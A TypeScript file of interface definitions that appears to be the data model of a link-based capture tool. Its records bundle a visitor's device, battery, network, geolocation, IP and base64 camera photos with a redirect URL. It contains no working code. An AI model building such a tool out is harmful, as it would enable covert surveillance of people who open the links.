
export interface DeviceInfo {
  browser: string;
  os: string;
  platform: string;
  language: string;
  screenResolution: string;
  cores: number;
  userAgent: string; // Explicitly included full browser identification string
  orientation: string;
  ram: number; // Physical RAM in GB (approximate, via navigator.deviceMemory)
  timezoneOffset: number; // in minutes from UTC
  timezoneName: string; // e.g., "America/New_York"
}

export interface BatteryInfo {
  level: number;
  charging: boolean;
  chargingTime: number;
  dischargingTime: number;
}

export interface NetworkInfo {
  type?: string;
  effectiveType?: string;
  downlink?: number;
  rtt?: number;
  saveData?: boolean;
}

export interface GeoLocation {
  lat: number;
  lon: number;
  accuracy: number;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  ip?: string;
}

export interface CaptureReport {
  id: string;
  timestamp: string;
  device: DeviceInfo;
  battery: BatteryInfo;
  network: NetworkInfo;
  location: GeoLocation;
  photos: string[]; // Base64 strings
  redirectUrl: string;
  linkId?: string;
}

export interface LinkConfig {
  id: string;
  redirectUrl: string;
  createdAt: string;
  name: string;
}
